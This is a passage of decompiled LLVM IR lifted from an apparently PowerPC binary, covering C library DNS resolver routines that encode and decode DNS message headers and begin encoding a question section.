  store i1 %v3_1000f2f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f2f0, label %dec_label_pc_1000f2f8, label %dec_label_pc_1000f304

dec_label_pc_1000f2f8:                            ; preds = %dec_label_pc_1000f2ec
  %v3_1000f2fc = inttoptr i32 %v2_1000f2fc to i8*
  store i8 58, i8* %v3_1000f2fc, align 1
  %v0_1000f300 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f300 = add i32 %v0_1000f300, 1
  store i32 %v1_1000f300, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f304

dec_label_pc_1000f304:                            ; preds = %dec_label_pc_1000f2ec, %dec_label_pc_1000f2e4, %dec_label_pc_1000f2f8
  %v2_1000f318 = phi i32 [ %v2_1000f2fc, %dec_label_pc_1000f2ec ], [ %v2_1000f23051, %dec_label_pc_1000f2e4 ], [ %v1_1000f300, %dec_label_pc_1000f2f8 ]
  %v1_1000f304 = sub i32 1, %v2_1000f200
  %v2_1000f30c = add i32 %v1_1000f304, %v2_1000f318
  %v1_1000f310 = load i32, i32* @r26, align 4
  %v2_1000f310 = icmp ult i32 %v2_1000f30c, %v1_1000f310
  %v4_1000f310 = icmp eq i32 %v2_1000f30c, %v1_1000f310
  store i1 %v2_1000f310, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000f310, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f318 = inttoptr i32 %v2_1000f318 to i8*
  store i8 0, i8* %v3_1000f318, align 1
  %v0_1000f31c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000f31c = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000f31c = or i1 %v0_1000f31c, %v1_1000f31c
  br i1 %v2_1000f31c, label %dec_label_pc_1000f334, label %dec_label_pc_1000f320

dec_label_pc_1000f320:                            ; preds = %dec_label_pc_1000f304
  %v0_1000f320 = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000f32c = inttoptr i32 %v0_1000f320 to i32*
  store i32 28, i32* %v2_1000f32c, align 4
  %v0_1000f358.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f354

dec_label_pc_1000f334:                            ; preds = %dec_label_pc_1000f304
  %v0_1000f334 = load i32, i32* @r25, align 4
  %v2_1000f338 = bitcast i32* %stack_var_-88 to i8*
  %v3_1000f338 = call i32 @strcpy(i32 %v0_1000f334, i8* %v2_1000f338)
  br label %dec_label_pc_1000f33c

dec_label_pc_1000f33c:                            ; preds = %dec_label_pc_1000f0f8, %dec_label_pc_1000f334
  %storemerge1 = phi i32 [ %v3_1000f104, %dec_label_pc_1000f0f8 ], [ %v3_1000f338, %dec_label_pc_1000f334 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f354

dec_label_pc_1000f344:                            ; preds = %dec_label_pc_1000f0ec
  %v0_1000f344 = call i32 @__errno_location()
  %v2_1000f34c = inttoptr i32 %v0_1000f344 to i32*
  store i32 97, i32* %v2_1000f34c, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f354

dec_label_pc_1000f354:                            ; preds = %dec_label_pc_1000f284, %dec_label_pc_1000f33c, %dec_label_pc_1000f320, %dec_label_pc_1000f344
  %v0_1000f358 = phi i32 [ 0, %dec_label_pc_1000f284 ], [ %storemerge1, %dec_label_pc_1000f33c ], [ %v0_1000f358.pre, %dec_label_pc_1000f320 ], [ 0, %dec_label_pc_1000f344 ]
  ret i32 %v0_1000f358

; uselistorder directives
  uselistorder i32 %v2_1000f318, { 1, 0 }
  uselistorder i32 %v2_1000f2ec, { 1, 0 }
  uselistorder i1 %v3_1000f20c, { 0, 2, 1 }
  uselistorder i32 %v0_1000f20c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000f2d8, { 2, 1, 0 }
  uselistorder i32 %v0_1000f29066, { 1, 0 }
  uselistorder i32 %v3_1000f294, { 1, 0 }
  uselistorder i32 %v0_1000f260, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000f250.pre, { 2, 0, 1 }
  uselistorder i32 %v1_1000f24c, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_1000f21c, { 1, 0 }
  uselistorder i32 %v0_1000f23c, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_1000f21c, { 0, 2, 1 }
  uselistorder i32 %v2_1000f248, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000f20c3, { 0, 2, 1 }
  uselistorder i32 %v0_1000f1f4, { 2, 1, 0 }
  uselistorder i32 %v0_1000f1e4.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_1000f1ec, { 1, 0, 2 }
  uselistorder i32 %v1_1000f1c8, { 2, 1, 0 }
  uselistorder i32 %v1_1000f1c4, { 1, 0 }
  uselistorder i32 %v0_1000f1a839, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1000f1b842, { 0, 2, 1, 3 }
  uselistorder i1 %v3_1000f17c, { 1, 0 }
  uselistorder i32 %v0_1000f1c4, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_1000f17c, { 1, 0 }
  uselistorder i32 %v0_1000f1a8, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1000f1b8, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1000f158, { 1, 0 }
  uselistorder i32 %v2_1000f150, { 1, 0 }
  uselistorder i32 %v0_1000f148, { 1, 0, 2 }
  uselistorder i32 %v1_1000f130, { 1, 0 }
  uselistorder i32 %v2_1000f10c, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 16, 12, 17, 14, 13, 15, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 16, 12, 17, 14, 13, 15, 19 }
  uselistorder i32 97, { 4, 5, 8, 7, 6, 0, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i32* @r8, { 5, 9, 10, 11, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 68, 69, 70, 71, 2, 61, 65, 66, 67, 7, 8, 72, 74, 75, 42, 62, 63, 64, 73, 43, 44, 45, 46, 47, 48, 49, 3, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 0, 60, 4, 6 }
  uselistorder i32* @r7, { 10, 11, 12, 13, 0, 14, 15, 16, 17, 1, 18, 19, 6, 20, 21, 22, 23, 2, 35, 36, 37, 8, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 7, 4, 5, 33, 34, 9 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 11, 0, 12, 13, 14, 7, 8, 9, 5, 6, 10, 15 }
  uselistorder i1 true, { 3, 0, 5, 6, 1, 2, 4 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 23, 22, 3, 2, 7, 6, 15, 0, 8, 1, 14, 21, 20, 19, 18, 17, 16, 13, 12, 11, 10, 9, 5, 4 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000f354, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f33c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f304, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f2d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f2b4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000f20c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f200, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f1e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1c4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000f1c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f178, { 1, 0 }
  uselistorder label %dec_label_pc_1000f130, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_1000f450, label %dec_label_pc_1000f378

dec_label_pc_1000f378:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_1000f378 = add i32 %tmp, 2
  %v2_1000f378 = inttoptr i32 %v1_1000f378 to i8*
  %v3_1000f378 = load i8, i8* %v2_1000f378, align 1
  %v4_1000f378 = zext i8 %v3_1000f378 to i32
  store i32 %v4_1000f378, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_1000f378, i8* %tmp3, align 1
  %v2_1000f384 = load i32, i32* %arg1, align 4
  store i32 %v2_1000f384, i32* %r0.global-to-local, align 4
  %v1_1000f388 = trunc i32 %v2_1000f384 to i8
  %v4_1000f388 = add i32 %arg2, 1
  %v5_1000f388 = inttoptr i32 %v4_1000f388 to i8*
  store i8 %v1_1000f388, i8* %v5_1000f388, align 1
  %v1_1000f38c = add i32 %tmp, 12
  %v2_1000f38c = inttoptr i32 %v1_1000f38c to i32*
  %v3_1000f38c = load i32, i32* %v2_1000f38c, align 4
  store i32 %v3_1000f38c, i32* %r0.global-to-local, align 4
  %v1_1000f390 = add i32 %tmp, 16
  %v2_1000f390 = inttoptr i32 %v1_1000f390 to i32*
  %v3_1000f390 = load i32, i32* %v2_1000f390, align 4
  store i32 %v3_1000f390, i32* %r11.global-to-local, align 4
  %v1_1000f394 = add i32 %tmp, 4
  %v2_1000f394 = inttoptr i32 %v1_1000f394 to i32*
  %v3_1000f394 = load i32, i32* %v2_1000f394, align 4
  %v2_1000f398 = icmp ne i32 %v3_1000f38c, 0
  %v5_1000f39c = zext i1 %v2_1000f398 to i32
  store i32 %v5_1000f39c, i32* %r10.global-to-local, align 4
  %v1_1000f3a0 = add i32 %tmp, 8
  %v2_1000f3a0 = inttoptr i32 %v1_1000f3a0 to i32*
  %v3_1000f3a0 = load i32, i32* %v2_1000f3a0, align 4
  %v2_1000f3a4 = icmp ne i32 %v3_1000f390, 0
  %v5_1000f3a8 = zext i1 %v2_1000f3a4 to i32
  %v1_1000f3ac = add i32 %tmp, 20
  %v2_1000f3ac = inttoptr i32 %v1_1000f3ac to i32*
  %v3_1000f3ac = load i32, i32* %v2_1000f3ac, align 4
  store i32 %v3_1000f3ac, i32* %r0.global-to-local, align 4
  %not.v2_1000f3b0 = icmp eq i32 %v3_1000f394, 0
  %v6_1000f3b4 = sext i1 %not.v2_1000f3b0 to i32
  store i32 %v5_1000f3a8, i32* %r11.global-to-local, align 4
  %v1_1000f3bc = call i32 @__asm_rlwinm(i32 %v6_1000f3b4, i32 0, i32 24, i32 24)
  %v0_1000f3c0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f3c0 = mul i32 %v0_1000f3c0, 4
  store i32 %v1_1000f3c0, i32* %r10.global-to-local, align 4
  %v1_1000f3c4 = call i32 @__asm_rlwinm(i32 %v3_1000f3a0, i32 3, i32 25, i32 28)
  %v0_1000f3c8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f3c8 = icmp ne i32 %v0_1000f3c8, 0
  %v5_1000f3cc = zext i1 %v2_1000f3c8 to i32
  %v2_1000f3d0 = or i32 %v1_1000f3c0, %v1_1000f3c4
  store i32 %v2_1000f3d0, i32* %r10.global-to-local, align 4
  %v1_1000f3d4 = add i32 %v1_1000f3bc, 128
  %v0_1000f3d8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f3d8 = mul i32 %v0_1000f3d8, 2
  store i32 %v1_1000f3d8, i32* %r11.global-to-local, align 4
  %v2_1000f3dc = or i32 %v2_1000f3d0, %v5_1000f3cc
  store i32 %v2_1000f3dc, i32* %r0.global-to-local, align 4
  %v2_1000f3e0 = or i32 %v2_1000f3dc, %v1_1000f3d4
  %v2_1000f3e4 = or i32 %v2_1000f3e0, %v1_1000f3d8
  %v1_1000f3e8 = trunc i32 %v2_1000f3e4 to i8
  %v4_1000f3e8 = add i32 %arg2, 2
  %v5_1000f3e8 = inttoptr i32 %v4_1000f3e8 to i8*
  store i8 %v1_1000f3e8, i8* %v5_1000f3e8, align 1
  %v1_1000f3ec = add i32 %tmp, 24
  %v2_1000f3ec = inttoptr i32 %v1_1000f3ec to i32*
  %v3_1000f3ec = load i32, i32* %v2_1000f3ec, align 4
  %v1_1000f3f0 = add i32 %tmp, 28
  %v2_1000f3f0 = inttoptr i32 %v1_1000f3f0 to i32*
  %v3_1000f3f0 = load i32, i32* %v2_1000f3f0, align 4
  store i32 %v3_1000f3f0, i32* %r0.global-to-local, align 4
  %not.v2_1000f3f4 = icmp eq i32 %v3_1000f3ec, 0
  %v6_1000f3f8 = sext i1 %not.v2_1000f3f4 to i32
  %v1_1000f3fc = call i32 @__asm_rlwinm(i32 %v6_1000f3f8, i32 0, i32 24, i32 24)
  %v1_1000f400 = urem i32 %v3_1000f3f0, 16
  store i32 %v1_1000f400, i32* %r0.global-to-local, align 4
  %v1_1000f404 = add i32 %v1_1000f3fc, 128
  %v2_1000f408 = or i32 %v1_1000f400, %v1_1000f404
  %v1_1000f40c = trunc i32 %v2_1000f408 to i8
  %v4_1000f40c = add i32 %arg2, 3
  %v5_1000f40c = inttoptr i32 %v4_1000f40c to i8*
  store i8 %v1_1000f40c, i8* %v5_1000f40c, align 1
  %v1_1000f410 = add i32 %tmp, 34
  %v2_1000f410 = inttoptr i32 %v1_1000f410 to i8*
  %v3_1000f410 = load i8, i8* %v2_1000f410, align 1
  %v4_1000f410 = zext i8 %v3_1000f410 to i32
  store i32 %v4_1000f410, i32* %r0.global-to-local, align 4
  %v4_1000f414 = add i32 %arg2, 4
  %v5_1000f414 = inttoptr i32 %v4_1000f414 to i8*
  store i8 %v3_1000f410, i8* %v5_1000f414, align 1
  %v1_1000f418 = add i32 %tmp, 32
  %v2_1000f418 = inttoptr i32 %v1_1000f418 to i32*
  %v3_1000f418 = load i32, i32* %v2_1000f418, align 4
  store i32 %v3_1000f418, i32* %r0.global-to-local, align 4
  %v1_1000f41c = trunc i32 %v3_1000f418 to i8
  %v4_1000f41c = add i32 %arg2, 5
  %v5_1000f41c = inttoptr i32 %v4_1000f41c to i8*
  store i8 %v1_1000f41c, i8* %v5_1000f41c, align 1
  %v1_1000f420 = add i32 %tmp, 38
  %v2_1000f420 = inttoptr i32 %v1_1000f420 to i8*
  %v3_1000f420 = load i8, i8* %v2_1000f420, align 1
  %v4_1000f420 = zext i8 %v3_1000f420 to i32
  store i32 %v4_1000f420, i32* %r0.global-to-local, align 4
  %v4_1000f424 = add i32 %arg2, 6
  %v5_1000f424 = inttoptr i32 %v4_1000f424 to i8*
  store i8 %v3_1000f420, i8* %v5_1000f424, align 1
  %v1_1000f428 = add i32 %tmp, 36
  %v2_1000f428 = inttoptr i32 %v1_1000f428 to i32*
  %v3_1000f428 = load i32, i32* %v2_1000f428, align 4
  store i32 %v3_1000f428, i32* %r0.global-to-local, align 4
  %v1_1000f42c = trunc i32 %v3_1000f428 to i8
  %v4_1000f42c = add i32 %arg2, 7
  %v5_1000f42c = inttoptr i32 %v4_1000f42c to i8*
  store i8 %v1_1000f42c, i8* %v5_1000f42c, align 1
  %v1_1000f430 = add i32 %tmp, 42
  %v2_1000f430 = inttoptr i32 %v1_1000f430 to i8*
  %v3_1000f430 = load i8, i8* %v2_1000f430, align 1
  %v4_1000f430 = zext i8 %v3_1000f430 to i32
  store i32 %v4_1000f430, i32* %r0.global-to-local, align 4
  %v4_1000f434 = add i32 %arg2, 8
  %v5_1000f434 = inttoptr i32 %v4_1000f434 to i8*
  store i8 %v3_1000f430, i8* %v5_1000f434, align 1
  %v1_1000f438 = add i32 %tmp, 40
  %v2_1000f438 = inttoptr i32 %v1_1000f438 to i32*
  %v3_1000f438 = load i32, i32* %v2_1000f438, align 4
  store i32 %v3_1000f438, i32* %r0.global-to-local, align 4
  %v1_1000f43c = trunc i32 %v3_1000f438 to i8
  %v4_1000f43c = add i32 %arg2, 9
  %v5_1000f43c = inttoptr i32 %v4_1000f43c to i8*
  store i8 %v1_1000f43c, i8* %v5_1000f43c, align 1
  %v1_1000f440 = add i32 %tmp, 46
  %v2_1000f440 = inttoptr i32 %v1_1000f440 to i8*
  %v3_1000f440 = load i8, i8* %v2_1000f440, align 1
  %v4_1000f440 = zext i8 %v3_1000f440 to i32
  store i32 %v4_1000f440, i32* %r0.global-to-local, align 4
  %v4_1000f444 = add i32 %arg2, 10
  %v5_1000f444 = inttoptr i32 %v4_1000f444 to i8*
  store i8 %v3_1000f440, i8* %v5_1000f444, align 1
  %v1_1000f448 = add i32 %tmp, 44
  %v2_1000f448 = inttoptr i32 %v1_1000f448 to i32*
  %v3_1000f448 = load i32, i32* %v2_1000f448, align 4
  store i32 %v3_1000f448, i32* %r0.global-to-local, align 4
  %v1_1000f44c = trunc i32 %v3_1000f448 to i8
  %v4_1000f44c = add i32 %arg2, 11
  %v5_1000f44c = inttoptr i32 %v4_1000f44c to i8*
  store i8 %v1_1000f44c, i8* %v5_1000f44c, align 1
  %v0_1000f450.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000f450

dec_label_pc_1000f450:                            ; preds = %entry, %dec_label_pc_1000f378
  %v0_1000f450 = phi i32 [ -1, %entry ], [ %v0_1000f450.pre, %dec_label_pc_1000f378 ]
  ret i32 %v0_1000f450

; uselistorder directives
  uselistorder i32 %v1_1000f400, { 1, 0 }
  uselistorder i32 %v1_1000f3d8, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder i32 38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f450, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1000f458 = load i8, i8* %arg1, align 1
  %v4_1000f458 = zext i8 %v3_1000f458 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_1000f460 = add i32 %tmp, 1
  %v3_1000f460 = inttoptr i32 %v2_1000f460 to i8*
  %v4_1000f460 = load i8, i8* %v3_1000f460, align 1
  %v5_1000f460 = zext i8 %v4_1000f460 to i32
  %v1_1000f468 = mul nuw nsw i32 %v4_1000f458, 256
  %v2_1000f46c = or i32 %v5_1000f460, %v1_1000f468
  %v2_1000f470 = inttoptr i32 %arg2 to i32*
  store i32 %v2_1000f46c, i32* %v2_1000f470, align 4
  %v0_1000f474 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f474 = add i32 %v0_1000f474, 2
  %v2_1000f474 = inttoptr i32 %v1_1000f474 to i8*
  %v3_1000f474 = load i8, i8* %v2_1000f474, align 1
  %v4_1000f474 = zext i8 %v3_1000f474 to i32
  %v1_1000f478 = call i32 @__asm_rlwinm(i32 %v4_1000f474, i32 25, i32 31, i32 31)
  %v2_1000f47c = add i32 %arg2, 4
  %v3_1000f47c = inttoptr i32 %v2_1000f47c to i32*
  store i32 %v1_1000f478, i32* %v3_1000f47c, align 4
  %v0_1000f480 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f480 = add i32 %v0_1000f480, 2
  %v2_1000f480 = inttoptr i32 %v1_1000f480 to i8*
  %v3_1000f480 = load i8, i8* %v2_1000f480, align 1
  %v4_1000f480 = zext i8 %v3_1000f480 to i32
  %v1_1000f484 = call i32 @__asm_rlwinm(i32 %v4_1000f480, i32 29, i32 28, i32 31)
  %v2_1000f488 = add i32 %arg2, 8
  %v3_1000f488 = inttoptr i32 %v2_1000f488 to i32*
  store i32 %v1_1000f484, i32* %v3_1000f488, align 4
  %v0_1000f48c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f48c = add i32 %v0_1000f48c, 2
  %v2_1000f48c = inttoptr i32 %v1_1000f48c to i8*
  %v3_1000f48c = load i8, i8* %v2_1000f48c, align 1
  %v4_1000f48c = zext i8 %v3_1000f48c to i32
  %v1_1000f490 = call i32 @__asm_rlwinm(i32 %v4_1000f48c, i32 30, i32 31, i32 31)
  %v2_1000f494 = add i32 %arg2, 12
  %v3_1000f494 = inttoptr i32 %v2_1000f494 to i32*
  store i32 %v1_1000f490, i32* %v3_1000f494, align 4
  %v0_1000f498 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f498 = add i32 %v0_1000f498, 2
  %v2_1000f498 = inttoptr i32 %v1_1000f498 to i8*
  %v3_1000f498 = load i8, i8* %v2_1000f498, align 1
  %v4_1000f498 = zext i8 %v3_1000f498 to i32
  %v1_1000f49c = call i32 @__asm_rlwinm(i32 %v4_1000f498, i32 31, i32 31, i32 31)
  %v2_1000f4a0 = add i32 %arg2, 16
  %v3_1000f4a0 = inttoptr i32 %v2_1000f4a0 to i32*
  store i32 %v1_1000f49c, i32* %v3_1000f4a0, align 4
  %v0_1000f4a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4a4 = add i32 %v0_1000f4a4, 2
  %v2_1000f4a4 = inttoptr i32 %v1_1000f4a4 to i8*
  %v3_1000f4a4 = load i8, i8* %v2_1000f4a4, align 1
  %tmp1 = urem i8 %v3_1000f4a4, 2
  %v1_1000f4a8 = zext i8 %tmp1 to i32
  %v2_1000f4ac = add i32 %arg2, 20
  %v3_1000f4ac = inttoptr i32 %v2_1000f4ac to i32*
  store i32 %v1_1000f4a8, i32* %v3_1000f4ac, align 4
  %v0_1000f4b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4b0 = add i32 %v0_1000f4b0, 3
  %v2_1000f4b0 = inttoptr i32 %v1_1000f4b0 to i8*
  %v3_1000f4b0 = load i8, i8* %v2_1000f4b0, align 1
  %v4_1000f4b0 = zext i8 %v3_1000f4b0 to i32
  %v1_1000f4b4 = call i32 @__asm_rlwinm(i32 %v4_1000f4b0, i32 25, i32 31, i32 31)
  %v2_1000f4b8 = add i32 %arg2, 24
  %v3_1000f4b8 = inttoptr i32 %v2_1000f4b8 to i32*
  store i32 %v1_1000f4b4, i32* %v3_1000f4b8, align 4
  %v0_1000f4bc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4bc = add i32 %v0_1000f4bc, 3
  %v2_1000f4bc = inttoptr i32 %v1_1000f4bc to i8*
  %v3_1000f4bc = load i8, i8* %v2_1000f4bc, align 1
  %tmp2 = urem i8 %v3_1000f4bc, 16
  %v1_1000f4c0 = zext i8 %tmp2 to i32
  %v2_1000f4c4 = add i32 %arg2, 28
  %v3_1000f4c4 = inttoptr i32 %v2_1000f4c4 to i32*
  store i32 %v1_1000f4c0, i32* %v3_1000f4c4, align 4
  %v0_1000f4c8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4c8 = add i32 %v0_1000f4c8, 4
  %v2_1000f4c8 = inttoptr i32 %v1_1000f4c8 to i8*
  %v3_1000f4c8 = load i8, i8* %v2_1000f4c8, align 1
  %v4_1000f4c8 = zext i8 %v3_1000f4c8 to i32
  %v1_1000f4cc = add i32 %v0_1000f4c8, 5
  %v2_1000f4cc = inttoptr i32 %v1_1000f4cc to i8*
  %v3_1000f4cc = load i8, i8* %v2_1000f4cc, align 1
  %v4_1000f4cc = zext i8 %v3_1000f4cc to i32
  %v1_1000f4d0 = mul nuw nsw i32 %v4_1000f4c8, 256
  %v2_1000f4d4 = or i32 %v4_1000f4cc, %v1_1000f4d0
  %v2_1000f4d8 = add i32 %arg2, 32
  %v3_1000f4d8 = inttoptr i32 %v2_1000f4d8 to i32*
  store i32 %v2_1000f4d4, i32* %v3_1000f4d8, align 4
  %v0_1000f4dc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4dc = add i32 %v0_1000f4dc, 6
  %v2_1000f4dc = inttoptr i32 %v1_1000f4dc to i8*
  %v3_1000f4dc = load i8, i8* %v2_1000f4dc, align 1
  %v4_1000f4dc = zext i8 %v3_1000f4dc to i32
  %v1_1000f4e0 = add i32 %v0_1000f4dc, 7
  %v2_1000f4e0 = inttoptr i32 %v1_1000f4e0 to i8*
  %v3_1000f4e0 = load i8, i8* %v2_1000f4e0, align 1
  %v4_1000f4e0 = zext i8 %v3_1000f4e0 to i32
  %v1_1000f4e4 = mul nuw nsw i32 %v4_1000f4dc, 256
  %v2_1000f4e8 = or i32 %v4_1000f4e0, %v1_1000f4e4
  %v2_1000f4ec = add i32 %arg2, 36
  %v3_1000f4ec = inttoptr i32 %v2_1000f4ec to i32*
  store i32 %v2_1000f4e8, i32* %v3_1000f4ec, align 4
  %v0_1000f4f0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4f0 = add i32 %v0_1000f4f0, 8
  %v2_1000f4f0 = inttoptr i32 %v1_1000f4f0 to i8*
  %v3_1000f4f0 = load i8, i8* %v2_1000f4f0, align 1
  %v4_1000f4f0 = zext i8 %v3_1000f4f0 to i32
  %v1_1000f4f4 = add i32 %v0_1000f4f0, 9
  %v2_1000f4f4 = inttoptr i32 %v1_1000f4f4 to i8*
  %v3_1000f4f4 = load i8, i8* %v2_1000f4f4, align 1
  %v4_1000f4f4 = zext i8 %v3_1000f4f4 to i32
  %v1_1000f4f8 = mul nuw nsw i32 %v4_1000f4f0, 256
  %v2_1000f4fc = or i32 %v4_1000f4f4, %v1_1000f4f8
  %v2_1000f500 = add i32 %arg2, 40
  %v3_1000f500 = inttoptr i32 %v2_1000f500 to i32*
  store i32 %v2_1000f4fc, i32* %v3_1000f500, align 4
  %v0_1000f504 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f504 = add i32 %v0_1000f504, 10
  %v2_1000f504 = inttoptr i32 %v1_1000f504 to i8*
  %v3_1000f504 = load i8, i8* %v2_1000f504, align 1
  %v4_1000f504 = zext i8 %v3_1000f504 to i32
  %v1_1000f508 = add i32 %v0_1000f504, 11
  %v2_1000f508 = inttoptr i32 %v1_1000f508 to i8*
  %v3_1000f508 = load i8, i8* %v2_1000f508, align 1
  %v4_1000f508 = zext i8 %v3_1000f508 to i32
  store i32 %v4_1000f508, i32* %r9.global-to-local, align 4
  %v1_1000f50c = mul nuw nsw i32 %v4_1000f504, 256
  %v2_1000f510 = or i32 %v4_1000f508, %v1_1000f50c
  %v2_1000f514 = add i32 %arg2, 44
  %v3_1000f514 = inttoptr i32 %v2_1000f514 to i32*
  store i32 %v2_1000f510, i32* %v3_1000f514, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 7, 8, 5, 6, 12, 4, 11, 10, 0, 9, 1, 2, 3 }
  uselistorder i32 11, { 13, 14, 6, 15, 5, 3, 7, 0, 1, 8, 9, 10, 11, 12, 2, 4 }
  uselistorder i32 40, { 8, 9, 2, 11, 10, 0, 3, 4, 5, 6, 7, 1 }
  uselistorder i32 7, { 9, 10, 2, 5, 6, 7, 8, 0, 1, 3, 4, 11 }
  uselistorder i32 5, { 15, 16, 6, 7, 8, 2, 3, 9, 0, 10, 11, 1, 12, 13, 4, 14, 5 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 10, 5, 6, 7, 8, 9, 0, 1, 2, 11, 3, 4, 12, 13, 14, 15 }
  uselistorder i32 28, { 34, 35, 36, 37, 4, 5, 10, 38, 18, 47, 42, 0, 43, 44, 45, 6, 7, 19, 12, 11, 39, 40, 20, 21, 22, 23, 24, 25, 28, 26, 27, 1, 29, 48, 41, 13, 14, 15, 16, 2, 3, 17, 8, 9, 30, 31, 32, 33, 46 }
  uselistorder i32 29, { 9, 12, 13, 10, 11, 8, 2, 14, 3, 15, 0, 1, 16, 17, 4, 5, 20, 21, 18, 19, 6, 7 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_1000f538 = load i32, i32* %arg1, align 4
  store i32 %v2_1000f538, i32* %r3.global-to-local, align 4
  store i32 268498240, i32* @lr, align 4
  %v1_1000f53c = inttoptr i32 %v2_1000f538 to i8*
  %v2_1000f53c = call i32 @__encode_dotted(i8* %v1_1000f53c)
  store i32 %v2_1000f53c, i32* %r3.global-to-local, align 4
  %v1_1000f540 = icmp slt i32 %v2_1000f53c, 0
  %v1_1000f544 = load i32, i32* @r29, align 4
  %v2_1000f544 = sub i32 %v1_1000f544, %v2_1000f53c
  store i32 %v2_1000f544, i32* @r29, align 4
  br i1 %v1_1000f540, label %dec_label_pc_1000f584, label %dec_label_pc_1000f550

dec_label_pc_1000f550:                            ; preds = %entry
